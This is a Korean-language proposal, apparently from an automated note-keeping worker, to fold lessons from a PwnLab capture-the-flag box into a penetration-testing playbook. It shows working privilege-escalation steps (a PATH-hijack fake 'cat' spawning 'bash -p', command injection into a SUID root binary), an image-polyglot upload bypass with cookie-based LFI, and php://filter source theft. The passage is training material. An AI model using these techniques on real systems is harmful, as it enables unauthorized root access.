# PwnLab → _PLAYBOOK 이관 제안

작성자: pg-note-forge (2026-08-26). `_PLAYBOOK.md` 는 직접 쓰지 않음 — 아래 제안을 `pg-line-manager` 가 반영.
⚠️ 반영 시점 참고 — 이 웨이브 중 `_PLAYBOOK.md` 의 실제 라인 번호가 다른 워커에 의해 계속 바뀌고 있었음(동시 grep 두 번이 다른 내용을 반환). 아래 위치 지정은 **헤더/항목 번호 기준**이고 라인 번호는 쓰지 않음.

---

## 1. A-1-10. tmux 에 던진 스캔이 «조용히» 죽는다 — 병합

기존 항목의 "같은 부류 ③"(`~/.zshrc` 별칭이 비대화형 tmux 안에서 안 먹음, [[Monster]] 출처) 바로 뒤에 PwnLab 사례를 추가 근거로 append.

**넣을 본문:**
> [[PwnLab]] 도 같은 함정 — `ssh kali "tmux new-session -d -s pwnlab_nmap 'cd ~/PG/PwnLab && nnmap 192.168.248.29 ...'"` 가 `zsh:1: command not found: nnmap` 로 0초에 죽었음(tmux capture-pane 실측, `~/PG/PwnLab/try2_nnmap_alias_notfound.log`). 10분 뒤 pane 을 다시 봐서야 발견, `nnmap` 을 `nmap -sCV -p- -Pn -A --min-rate 5000` 로 풀어써 17:47 에 재실행. **다행히 quick 스캔(21/22/80/111/139/443/445/3306/8080)은 이미 별도 세션에서 정상 진행 중이었어서 침투 자체는 지연되지 않았음** — 손실은 순수히 "안 도는 줄 몰랐던 10분"뿐.

**지우기 전 원문**(구 6장 (1), 노트에서 삭제):
```
**(1) `nnmap` 별칭이 tmux 안에서 안 먹는다** — `try2_nnmap_alias_notfound.log`

`ssh kali "tmux new-session -d -s pwnlab_nmap 'cd ~/PG/PwnLab && nnmap 192.168.248.29 ...'"` 로 스캔을 걸어놓고 다른 일을 하다가, 10분 뒤 결과를 보러 갔더니 pane 에 이게 있었다.

```bash
zsh:1: command not found: nnmap
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$
```

`nnmap` 은 `~/.zshrc` 의 별칭인데, tmux 가 명령 문자열을 실행할 때는 그 초기화 파일이 안 읽힌다. **스캔이 0초 만에 끝나 있었고 나는 그걸 "돌고 있는 중"으로 착각했다.** 결국 `-p-` 결과는 17:47 에야 나왔다(다행히 침투는 quick 스캔으로 이미 진행 중이었다). 교훈은 두 개다 — 별칭은 tmux 안에서 전개해서 쓸 것, 그리고 **백그라운드에 던진 작업은 "돌고 있겠지" 대신 pane 을 한 번 볼 것.**
```

---

## 2. A-24. 한 서비스의 거부는 자격증명의 오류가 아니다 — 병합

기존 "MySQL 은 에러 번호로 원인이 갈림 — `1130` 과 `1045` 를 구분할 것" 블록 뒤에 형제 사례로 append(클라이언트 호환성 + 잠금 에러 코드 추가).

**넣을 본문:**
> **MySQL 클라이언트 계열이 다르면 SSL 요구 사항도 다르다.** [[PwnLab]] — Kali 의 MariaDB 클라이언트(11.8.3-MariaDB, client 15.2)는 기본으로 TLS 를 요구하는데 대상 MySQL 5.5.47 은 TLS 를 지원 안 함:
> ```text
> ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
> ```
> 반사적으로 `--ssl-mode=DISABLED` 를 쓰면 **더 헷갈리는 에러**가 남 — 그건 Oracle MySQL 클라이언트 옵션이라 MariaDB 에서는 `mysql: unknown variable 'ssl-mode=DISABLED'` 로 죽음. **MariaDB 쪽 정답은 `--skip-ssl`.**
>
> **`max_connect_errors` 도 자격증명 오류처럼 보이는 별개의 락아웃이다.** 실패한 접속(핸드셰이크 실패 포함)을 반복하면:
> ```text
> ERROR 2002 (HY000): Received error packet before completion of TLS handshake. ... 1129 - Host '192.168.45.207' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
> ```
> 시험장에서 DB 에 크리덴셜 여러 개를 순차 시도하다 이 에러를 만나면 "비밀번호가 다 틀렸다"로 오판하기 쉽다 — **에러 코드/문구가 1045(자격증명 오류)·1130(호스트 거부)·1129(연결오류 누적 차단)로 전부 다르므로 문구를 구분해서 읽을 것.**
> — 출처: `~/PG/PwnLab/try3_mysql_ssl.log`

**지우기 전 원문**(구 6장 (2), 노트에서 삭제):
```
**(2) MySQL 클라이언트가 SSL 로 죽는다** — `try3_mysql_ssl.log`

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

Kali 의 MariaDB 클라이언트는 요즘 기본이 TLS 요구다. MySQL 5.5 는 그걸 못 한다. 반사적으로 `--ssl-mode=DISABLED` 를 쳤는데 그건 **Oracle MySQL 클라이언트 옵션**이라 MariaDB 에서는 이렇게 죽는다.

```text
mysql: unknown variable 'ssl-mode=DISABLED'
```

MariaDB 쪽 이름은 `--skip-ssl` 이다. 낡은 DB 를 만나면 클라이언트 계열부터 확인하는 게 빠르다.

같은 파일에 하나 더 남았다. 나중에 로그를 재현하려고 실패 명령을 반복했더니 서버가 우리 IP 를 차단했다.

```text
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.207' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
```

MySQL 의 `max_connect_errors` 다. **핸드셰이크 실패도 카운트에 들어간다.** 시험장에서 DB 에 크리덴셜을 여러 개 시도할 때 이걸 모르면 "비밀번호가 다 틀렸다"고 오판하게 된다. 차단되면 에러 메시지 자체가 바뀌니 문구를 구분해서 읽어야 한다.
```

---

## 3. A-41. 셸은 잡았는데 권한상승 실마리가 없다 — 병합 (기존 [[PwnLab]] 교차참조 상세화)

이 항목에는 이미 PwnLab 을 가리키는 문장이 있음 — "[[PwnLab]] 에서 `find / -perm -4000` 이 `/home/*` 의 `drwxr-x---` 때문에 커스텀 SUID 를 놓친 것과 **정확히 같은 함정**이고" (Monster 사례 설명 중). 이 문장 **바로 뒤**에 PwnLab 실측 diff 를 상세 사례로 추가.

**넣을 본문:**
> **[[PwnLab]] 상세** — www-data 시점 `harvest.sh` 의 SUID 목록은 배포판 표준 15개뿐이라 "커스텀 SUID 없음"으로 읽혔음. 그런데 이 박스의 권한상승 경로는 **그 빠진 두 줄이 전부**였다.
> ```text
> $ diff <(sed -n '/===== SUID/,/^===== SGID/p' harvest_www-data.txt) \
>        <(sed -n '/===== SUID/,/^===== SGID/p' harvest_root.txt)
> > /home/mike/msg2root
> > /home/kane/msgmike
> ```
> `/home/*` 이 `drwxr-x---` 라 `find` 가 못 들어갔고, `Permission denied` 는 `2>/dev/null` 로 버려져 **에러조차 안 남는다.** 침묵이 곧 "없음"으로 보이는 형태라 시험장에서 사람을 통째로 헛다리 짚게 만듦. → **사용자 계정을 옆걸음(su·SSH 등)으로 얻을 때마다 SUID·크론·`getcap` 열거를 그 계정 권한으로 다시 돌릴 것.**
> — 출처: `~/PG/PwnLab/harvest_www-data.txt`(31492B) vs `~/PG/PwnLab/harvest_root.txt`(36138B)

**추가로 붙일 짧은 각주** (막다른 길 기록, `[가정]` 보존):
> [[PwnLab]] 의 다른 막다른 길 — `kent` 계정은 DB 비밀번호 재사용으로 로그인은 됐지만 홈이 완전히 비어 있었음. `/home/john` 도 존재하고 셸도 `/bin/bash` 인데 root 로 확인해도 dotfile 뿐이고 DB `users` 테이블에도 없음 — PG 가 추가한 장식으로 보임 `[가정]`(실제로 익스플로잇을 시도하지는 않음, 검증 안 됨). `mount.nfs` 가 SUID 이고 111/rpcbind 가 열려 있어 잠깐 눈길이 갔으나 `/etc/exports` 가 비어 있고 2049 도 안 열려 있어 경로가 아니었음.

**지우기 전 원문**(구 4-1 danger 콜아웃 + 구 6장 (5), 노트에서 삭제):
```
> [!danger] `find / -perm -4000` 은 "내가 들어갈 수 있는 디렉터리" 안에서만 참이다
> `/home/*` 이 전부 `drwxr-x---` 라 www-data 는 디렉터리를 열 수 없고, 그래서 그 안의 SUID 바이너리가
> **에러 없이 그냥 목록에서 빠진다**(`find` 의 `Permission denied` 는 `2>/dev/null` 로 버려진다).
> **커스텀 SUID 가 안 보인다 = 없다** 가 아니다. 사용자 계정으로 옆걸음한 뒤 **같은 열거를 다시 돌려라.**
> 이 박스는 그 차이가 곧 권한상승 경로 전체였다.

**(5) www-data 로 돌린 SUID 열거를 결론으로 믿을 뻔했다** — `harvest_www-data.txt` vs `harvest_root.txt`

두 파일의 `===== SUID =====` 섹션을 나란히 놓으면 차이가 두 줄이다.

```text
$ diff <(sed -n '/===== SUID/,/^===== SGID/p' harvest_www-data.txt) \
       <(sed -n '/===== SUID/,/^===== SGID/p' harvest_root.txt)
> /home/mike/msg2root
> /home/kane/msgmike
```

www-data 시점 목록은 배포판 기본 15개뿐이라 "커스텀 SUID 없음"으로 읽힌다. 그런데 이 박스의 권한상승 경로는 **그 빠진 두 줄이 전부**였다. `/home/*` 이 `drwxr-x---` 라 `find` 가 못 들어갔고, `Permission denied` 는 `2>/dev/null` 로 버려져 **에러조차 안 남는다.** 침묵이 곧 "없음"으로 보이는 형태라 시험장에서 사람을 통째로 헛다리 짚게 만든다. 4-1의 경고와 같은 이야기고, 재현은 위 `diff` 한 줄이면 된다.

**막다른 길로 접은 것들**

- **kent 계정** — DB 비밀번호가 통해서 로그인은 됐지만 홈이 완전히 비어 있었다. 세 계정 중 kane 만 의미가 있었다.
- **`john` 사용자** — `/home/john` 이 존재하고 셸도 `/bin/bash` 인데, root 로 들어가 보니 dotfile 만 있고 완전히 비어 있다. DB `users` 테이블에도 없다. PG 가 추가한 장식으로 보인다 `[가정]`.
- **NFS** — `mount.nfs` 가 SUID 이고 111/rpcbind 가 열려 있어 잠깐 봤지만 `/etc/exports` 가 비어 있고 2049 도 안 열려 있다.
- **login.php SQLi** — 소스를 읽어보니 prepared statement 라 시도조차 안 했다. **소스를 먼저 읽은 것이 여기서 시간을 벌었다.**
```

---

## 4. A-4 권한상승 (신규) — 셸 안에서 페이로드 작성 시 bash 히스토리 확장이 `!` 를 먹는다

**넣을 본문:**
> #### (신규). SUID 하이재킹용 스크립트를 짤 때 bash 히스토리 확장이 `#!` 를 먹는다
>
> **증상** — 큰따옴표 안에 `#!/bin/bash` 를 넣어 가짜 바이너리를 만들려는데 `bash: !/bin/bash\nexec: event not found` 로 명령 자체가 실행되지 않음.
>
> [[PwnLab]] 실측:
> ```text
> mkdir -p /tmp/.pth && printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat && chmod +x /tmp/.pth/cat && PATH=/tmp/.pth:$PATH /home/kane/msgmike
> bash: !/bin/bash\nexec: event not found
> ```
> 큰따옴표 안의 `!` 가 히스토리 확장으로 해석됨. **`&&` 로 이어붙인 줄 전체가 폐기**돼 `mkdir` 조차 실행되지 않음 — 뒷부분만 실패한 게 아니라 **그 줄 자체가 통째로 안 돎.**
>
> 따옴표를 갈라 `!` 를 확장에서 떼어내는 우회(`'#''!/bin/bash'`)를 먼저 시도했더니 **다른 에러 셋**이 났음(`No such file or directory` 등) — 실은 우회 자체는 성공했고(`event not found` 가 더 이상 안 남), 앞 줄에서 `mkdir` 이 안 돈 탓에 디렉터리가 없어서였음. **에러 문구가 바뀌었으면 원인도 바뀐 것으로 읽을 것** — 여기서 "따옴표 우회도 안 되나"로 잠깐 헛짚었음.
>
> `set +H` 를 **같은 줄 앞**에 붙이는 것도 소용없음 — 히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄의 `set +H` 는 이미 늦음:
> ```text
> kane@pwnlab:/tmp$ set +H; mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
> bash: !/bin/bash\nexec: event not found
> ```
> → **해법은 `set +H` 를 별도 줄로 먼저 보내는 것.** 홑따옴표로 감싸도 되지만, 셸을 `send-keys`/리버스셸로 원격 조종하는 상황에서는 따옴표가 여러 겹 중첩되므로 `set +H` 한 줄이 더 안전함.
>
> — 출처: `~/PG/PwnLab/try1_msgmike_histexpand.log`

**지우기 전 원문**(구 6장 (3), 노트에서 삭제):
```
**(3) bash 히스토리 확장이 `#!` 를 먹는다** — `try1_msgmike_histexpand.log`

가짜 `cat` 을 만들려고 이렇게 쳤다.

```text
mkdir -p /tmp/.pth && printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat && chmod +x /tmp/.pth/cat && PATH=/tmp/.pth:$PATH /home/kane/msgmike
bash: !/bin/bash\nexec: event not found
```

큰따옴표 안의 `!` 가 히스토리 확장으로 해석된다. 문제는 그 다음이다 — **`&&` 로 이어붙여 놨기 때문에 줄 전체가 폐기돼 `mkdir` 조차 실행되지 않았다.**

그래서 따옴표를 갈라 `!` 를 확장에서 떼어내는 우회를 먼저 시도했는데, 이번엔 다른 에러가 셋 나왔다.

```bash
kane@pwnlab:/tmp$ printf '%s\n' '#''!/bin/bash' 'exec /bin/bash -p' > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
bash: /tmp/.pth/cat: No such file or directory
chmod: cannot access '/tmp/.pth/cat': No such file or directory
cat: /tmp/.pth/cat: No such file or directory
```

**따옴표 우회 자체는 통했다**(`event not found` 가 안 난다). 실패한 이유는 앞 줄에서 `mkdir` 이 안 돌아 `/tmp/.pth` 가 없기 때문이다. 여기서 잠깐 "따옴표 우회도 안 되나" 하고 엉뚱한 데를 팠다. **에러 문구가 바뀌었으면 원인도 바뀐 것**이라고 읽었어야 했다.

`set +H` 를 같은 줄 앞에 붙이는 것도 안 된다.

```bash
kane@pwnlab:/tmp$ set +H; mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
bash: !/bin/bash\nexec: event not found
```

히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄의 `set +H` 는 이미 늦다. 별도 줄로 먼저 보내니 통했다(4-3의 블록). 홑따옴표로 감싸도 되지만, 셸을 `send-keys` 로 원격 조종하는 상황에서는 따옴표가 여러 겹 중첩되니 `set +H` 한 줄이 더 깔끔하다.

곁다리 교훈 하나 — 이 세 번의 실패는 전부 **`&&`/`;` 로 길게 이어붙인 한 줄** 때문에 원인 파악이 늦어졌다. 파일을 만들고 실행하는 단계는 끊어서 치는 편이 결국 빠르다.
```

---

## 5. A-4 권한상승 (신규) — PATH 하이재킹이 후속 SUID 체인까지 상속돼 명령을 조용히 삼킨다

**넣을 본문:**
> #### (신규). PATH 하이재킹용 디렉터리가 다단계 SUID 체인을 타고 root 셸까지 상속된다
>
> **증상** — root 를 잡고 증거 형식대로 `cat` 을 쳤는데 플래그도 `echo` 로 찍은 구분자(`---`)도 전혀 안 나옴. `echo` 는 bash 내장이라 PATH 와 무관하게 항상 동작해야 하는데 그것조차 안 찍혔다는 것이 **줄 전체가 끊겼다**는 결정적 단서.
>
> [[PwnLab]] 실측:
> ```text
> root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
> root
> uid=0(root) gid=0(root) groups=0(root),1003(kane)
> pwnlab
> 192.168.248.29 
> Thu Aug 20 04:45:44 EDT 2026
> root@pwnlab:/tmp# 
> ```
> **원인** — `PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 넘긴 환경변수가 mike → msg2root → root **3단계 셸까지 그대로 상속**됨. `cat` 이 이전 단계에서 심은 가짜 `cat`(`exec /bin/bash -p`)으로 해석되고, `exec` 는 프로세스를 통째로 갈아치우므로 **그 줄의 나머지(`echo ---; cat /root/flag.txt`)를 파싱해 들고 있던 셸이 통째로 사라짐.** 새로 뜬 bash 가 프롬프트를 다시 그려 겉보기엔 "`cat` 이 아무것도 안 하고 돌아온" 것처럼 보임.
>
> 확인·복원:
> ```text
> root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; cat /root/proof.txt
> PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
> 540256bedfbf87d15d54425649220e30
> ```
> → **PATH 하이재킹으로 셸을 얻었으면 그 즉시 PATH 를 표준값으로 되돌릴 것.** 이 박스는 `cat` 하나만 오염됐지만 `ls`·`id` 를 덮어썼다면 이후 열거 결과 전체를 못 믿게 됨. 증상이 "에러"가 아니라 **"조용한 무출력"**이라 원인을 엉뚱한 데서 찾게 되는데, 명령을 `; echo ---` 로 이어 쳐두면 구분이 됨 — `---` 가 찍히면 그 명령만 실패한 것이고, **안 찍히면 줄 자체가 끊긴 것.**
>
> — 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`

**지우기 전 원문**(구 6장 (4), 노트에서 삭제):
```
**(4) 가짜 `cat` 이 root 셸까지 따라와 플래그를 삼켰다** — `try4_fakecat_shadowed_PATH.log`

root 를 잡고 나서 증거 형식대로 쳤는데 플래그가 안 나왔다.

```bash
root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:44 EDT 2026
root@pwnlab:/tmp# 
```

플래그도 안 나오지만 **`---` 도 안 찍혔다.** 이게 결정적 단서다 — `echo` 는 bash 내장이라 PATH 와 무관하게 항상 동작해야 한다. 그게 안 나왔다는 건 `cat /root/proof.txt` 에서 **줄 전체가 끊긴 것**이지 `cat` 이 조용히 실패한 게 아니다. 직전 실행(4-4)에서 `ls -la /root` 는 `-rw-r--r-- 1 root root 33 proof.txt` 를 멀쩡히 보여줬으니 파일 문제도 아니다.

원인은 PATH 였다. 확인과 복원을 한 줄에 붙여 쳤다.

```bash
root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:59 EDT 2026
540256bedfbf87d15d54425649220e30
---
Your flag is in another file...
```

`PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 넘긴 환경변수가 **mike 셸 → msg2root → root 셸까지 3단계를 그대로 상속**했다. 그래서 `cat` 은 우리가 만든 가짜 `cat` 으로 해석됐고, 그 내용이 `exec /bin/bash -p` 다. `exec` 는 프로세스를 통째로 갈아치우므로 **그 줄의 나머지(`echo ---; cat /root/flag.txt`)를 파싱해 들고 있던 셸이 사라진다.** 새로 뜬 bash 가 프롬프트를 다시 그리고, 겉보기엔 "cat 이 아무것도 안 하고 돌아온" 것처럼 보인다.

`/root/flag.txt` 가 여기서 처음 읽힌다 — 모드 000 이지만 root 라서 읽을 수 있고, 내용은 미끼다.

> [!tip] PATH 하이재킹으로 셸을 얻었으면 그 즉시 PATH 를 되돌려라
> 하이재킹용 디렉터리가 PATH 에 남아 있는 한 **모든 후속 명령이 오염된다.** 이 박스는 `cat` 하나였지만
> `ls`·`id` 를 덮어썼다면 열거 결과 전체를 못 믿게 된다. 증상이 "에러"가 아니라 **"조용한 무출력"** 이라
> 원인을 엉뚱한 데서 찾게 되는데, 명령을 `; echo ---` 로 이어 쳐두면 구분이 된다 —
> `---` 가 찍히면 그 명령만 실패한 것이고, **안 찍히면 줄 자체가 끊긴 것이다.**
```

---

## 6. B-3 리눅스 권한상승 (신규) — SUID 바이너리의 상대경로 외부명령 호출 → PATH 하이재킹 (고전형)

기존 B-32(문자 필터를 `$()` 로 우회)·B-33(dash 에서 euid 상실)과는 다른, **필터조차 없는 가장 기초적인 PATH 하이재킹** 사례. 이 형태의 전용 카드가 아직 없어 신규로 제안.

**넣을 본문:**
> #### (신규). SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다
>
> **탐지 3초 반사** — SUID 바이너리를 만나면 `strings <바이너리>` 먼저. `system`/`popen`/`execlp` 계열 심볼과 함께 절대경로 없는 명령 문자열(`cat`·`ls`·`cp` 등)이 보이면 그 즉시 후보.
>
> [[PwnLab]] `msgmike`(SUID mike):
> ```text
> $ strings /home/kane/msgmike | grep -i cat
> cat /home/mike/msg.txt
> ```
> `system` 과 `setreuid` 가 심볼 목록에 함께 있고, 호출 문자열이 `cat` 을 **절대경로 없이** 부름.
>
> **공격**:
> ```bash
> mkdir -p /tmp/.pth
> printf '#!/bin/bash\nexec /bin/bash -p\n' > /tmp/.pth/cat   # 반드시 별도 줄로(A-4 히스토리확장 함정)
> chmod +x /tmp/.pth/cat
> PATH=/tmp/.pth:$PATH /home/kane/msgmike
> ```
> 실행 직후 프롬프트가 `kane@` → `mike@` 로 바뀌면 성공. `msgmike` 가 `setreuid` 를 먼저 호출해 **real uid 까지** mike 로 바뀌었음 — 일반적인 경우(`setreuid` 미호출)라면 euid 만 바뀌고 `sh` 경유 시 손실될 수 있음(B-33).
>
> ⚠️ **하이재킹으로 얻은 셸은 PATH 오염 상태다.** 다음 단계로 넘어가기 전에 표준 PATH 로 복원할 것 — 안 하면 다단계 체인에서 뒷단이 조용히 실패함(A-4, 같은 박스 사례).
>
> **출처** — [[PwnLab]](`msgmike`).

**지우기 전 원문**: 해당 항목은 새 노트 본문(Privilege Escalation – SUID msgmike 절)에 그대로 남아 있음 — 순수 신규 일반화 카드라 "지우는" 원문 없음.

---

## 7. B-32. SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다 — 병합 (형제 사례)

기존 항목 끝에 "**출처**" 뒤로, "필터가 아예 없는" 더 단순한 형제 사례 추가.

**넣을 본문:**
> **형제 사례 — 필터가 아예 없으면 세미콜론 하나로 끝난다.** [[PwnLab]] `msg2root`(SUID root):
> ```text
> $ strings /home/mike/msg2root | head -30
> fgets
> asprintf
> system
> Message for root: 
> /bin/echo %s >> /root/messages.txt
> ```
> `fgets` 로 stdin 을 받아 `asprintf` 로 포맷(`/bin/echo %s >> /root/messages.txt`)에 그대로 끼운 뒤 `system()` 실행 — 필터가 전무해 `$()` 같은 우회 기법조차 필요 없음. 세미콜론 하나로 충분:
> ```text
> Message for root: hi; /bin/bash -p
> hi
> bash-4.3# id
> uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
> ```
> `hi` 가 먼저 출력되는 것이 `/bin/echo hi` 정상 실행 신호. **`/bin/echo` 자체는 절대경로라 PATH 하이재킹은 안 통하지만, 무필터 문자열 삽입이 더 직접적인 구멍이었음.** → SUID 바이너리를 만나면 PATH 하이재킹(상대경로)과 문자열 삽입(포맷/커맨드 인젝션) **둘 다** 확인할 것 — 서로 배타적이지 않음.
> — 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`

**지우기 전 원문**: 해당 내용은 새 노트 본문(Privilege Escalation – SUID msg2root 절)에 그대로 남아 있음 — 인용문 형태 그대로라 "지우는" 원문 없음.

---

## 8. B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다 — 병합

기존 사례([[Exghost]] ExifTool 폴리글롯) 뒤에 더 고전적인 형제 사례로 추가.

**넣을 본문:**
> **형제 사례 — 3중 검사가 각각 다른 곳만 보는 고전형.** [[PwnLab]] `upload.php`:
> | 검사 | 보는 것 | 우회 |
> |---|---|---|
> | `strrchr($filename,'.')` 화이트리스트 | 파일명의 마지막 점 이후 | 파일명을 `.gif` 로 |
> | `strpos($filetype,'image')` | 클라이언트가 보낸 `Content-Type` | 우리가 정하는 값 |
> | `getimagesize()['mime']` | 파일 내용의 매직바이트 | GIF 헤더를 앞에 붙임 |
>
> GIF89a 헤더 + PHP 태그 폴리글롯이 세 검사를 동시에 통과 — PHP 인터프리터는 파일 앞쪽 쓰레기를 무시하고 `<?php` 부터 실행하므로 확장자가 `.gif` 로 남아도 무방함. **직접 요청(Apache 가 `.gif` 를 PHP 로 실행 안 함)이 아니라 별개의 `include()` 로 읽혔기 때문** — include 는 확장자를 안 봄. 즉 이 우회가 성립하려면 "실행 경로가 확장자 기반이 아닌 include/require" 라는 조건이 하나 더 필요함.
> — 출처: `~/PG/PwnLab/src_upload.php`

**지우기 전 원문**: 새 노트 본문(Initial Access 상세 절)에 그대로 남아 있음.

---

## 9. B-1 웹 (신규) — 같은 앱에 LFI 진입점이 두 개일 수 있다, 하나만 찾고 멈추지 말 것

**넣을 본문:**
> #### (신규). LFI include() 싱크가 하나의 앱에 두 개 있을 수 있다 — 하나는 소스전용, 하나는 실행가능
>
> **증상** — `?page=` 류 파라미터로 LFI 를 확인했는데 확장자가 강제로 붙어(`include($_GET['page'].".php")`) 소스 읽기 이상으로 못 감. "LFI 는 찾았는데 실행이 안 된다"로 접으면 놓침.
>
> [[PwnLab]] — 그 첫 번째 LFI 로 뽑아낸 `index.php` 소스 **안에** 두 번째 include 가 있었음:
> ```php
> if (isset($_COOKIE['lang']))
> {
> 	include("lang/".$_COOKIE['lang']);
> }
> // Not implemented yet.
> ```
> 주석이 "Not implemented yet" 이라 죽은 코드처럼 보이지만 실제로 실행됨 — **확장자 강제가 없어** 업로드한 임의 파일을 그대로 include 시킬 수 있었음.
>
> → **`php://filter` 로 소스를 확보했으면 그 소스의 모든 `include`/`require` 호출부를 훑을 것.** 첫 번째로 찾은 LFI 싱크가 하드닝돼 있다고 애플리케이션 전체가 안전한 것은 아님 — 같은 파일에 두 번째 싱크가 나란히 있는 경우가 실재함.
>
> **`php://filter` 로 소스를 읽을 때 확장자를 붙일지 말지는 그 코드가 결정한다.** `include($_GET['page'].".php")` 면 `resource=config`(확장자 없이), `include($_GET['page'])` 면 `resource=config.php`(확장자 포함). 한 번 틀리면 빈 결과가 나오는데 원인 파악이 오래 걸림.
>
> **출처** — [[PwnLab]].

**지우기 전 원문**: 새 노트 본문(Initial Access 상세 절)에 재현이 그대로 남아 있음 — 이 카드는 그 재현의 일반화라 별도 삭제 대상 없음. 단, 구 0장(배우는 것)의 아래 두 줄은 노트에서 제거함:
```
- **같은 앱에 LFI 진입점이 두 개**다. 하나(`?page=`)는 `.php` 가 강제로 붙어 소스 읽기에만 쓸 수 있고, 다른 하나(`Cookie: lang=`)는 확장자가 안 붙어 임의 파일 실행에 쓸 수 있다. **한쪽을 찾았다고 만족하고 멈추면 셸까지 못 간다.**
- `php://filter/convert.base64-encode/resource=` 로 PHP 소스를 그대로 빼내는 법
```

---

## 10. D. 시간 배분 · 손절 기준 — 병합 (Metasploit 미사용 사례)

기존 "Metasploit 대안이 있어도 일부러 안 쓰는 판단이 시험 전략임"([[Wombo]]·[[Mice]]·[[Outdated]] 나열) 문장에 [[PwnLab]] 추가.

**넣을 본문:**
> [[PwnLab]] 은 애초에 Metasploit 모듈을 찾지도 않음 — 전 과정이 `curl`·`mysql`·`nc`·`strings` 로 끝나 1대 한정 카드를 아예 안 씀.

**지우기 전 원문**(구 7장 #10, 노트에서 삭제):
```
10. **Metasploit 을 쓰지 않았다.** 전 과정이 `curl`·`mysql`·`nc`·`strings` 로 끝나므로 1대 한정 카드를 아낄 수 있다.
```

---

## 11. A-41 권한상승 (신규 소항목) — sudo 미설치가 「막힘」이 아니라 「결론」인 경우

**넣을 본문:**
> #### (신규 소항목). `sudo` 가 아예 설치되지 않은 배포판 최소 설치
>
> [[PwnLab]] — `harvest.sh` 의 SUDO 섹션이 `/tmp/h.sh: 30: /tmp/h.sh: sudo: not found` 로 끝남(Debian 8 최소 설치 기본 상태, root 셸에서 친 `which sudo` 도 빈손). `sudo -l` 을 반사적으로 먼저 치는 습관 때문에 여기서 멈칫하기 쉬운데, **없는 것도 정보다** — `command not found` 는 실패가 아니라 "sudo 경로 자체가 없다"는 결론이므로 곧장 SUID/크론/캡ability 열거로 넘어갈 것.
> — 출처: `~/PG/PwnLab/harvest_www-data.txt` `===== SUDO =====` 절(`which sudo` 빈손은 `~/PG/PwnLab/shell_www-data.log`). ⚠️ 이 항목의 이전 판은 출처를 `traces_confirmed.log` 로 적었으나 그 파일에는 SUDO 절이 없음 — 감사에서 정정(2026-08-26).

**지우기 전 원문**(구 7장 #5, 노트에서 삭제):
```
5. **`sudo` 가 없는 박스가 있다.** `sudo -l` 이 `command not found` 면 그건 실패가 아니라 결론이다.
```
(구 4-1 장의 관련 산문도 함께 제거:)
```
`sudo` 가 **아예 설치돼 있지 않다**(`which sudo` 도 빈손이었다). Debian 8 최소 설치의 기본 상태다. `sudo -l` 이 첫 수인 습관 때문에 여기서 잠깐 멈칫하게 되는데, 없는 것도 정보다 — sudo 경로는 접어도 된다.
```

---

## 12. C-2. 셸 직후 (신규 소항목) — `strings <SUID바이너리>` 3초 반사

**넣을 본문:**
> **SUID 바이너리를 만나면 `strings <바이너리>` 부터.** 상대경로 명령(`cat`·`ls`)이 보이면 B-3(신규, PATH 하이재킹) · 포맷/커맨드 인젝션 흔적(`system`·`asprintf`·`popen`)이 보이면 B-32. 둘 다 아니면 `ltrace`/`strace`. [[PwnLab]] 은 `msgmike`·`msg2root` 둘 다 이 반사 하나로 갈렸음(각각 A-4/B-3·B-32).

**지우기 전 원문**(구 7장 #7, 노트에서 삭제):
```
7. **`strings <SUID바이너리>` 는 3초짜리 반사다.** 상대경로 명령(`cat`, `ls`) → PATH 하이재킹. `system("... %s ...")` → 인젝션. 둘 다 아니면 `ltrace`/`strace`.
```

---

## 13. A-25. 그럴듯한 로그인 폼이 미끼일 수 있다 — 병합 (반대 판단 사례)

기존 [[Robust]] 사례(로그인 폼이 실제로 미끼였던 경우) 뒤에 **반대로 "소스를 먼저 읽고 SQLi 를 배제한 것이 옳았던" 대조 사례**로 추가.

**넣을 본문:**
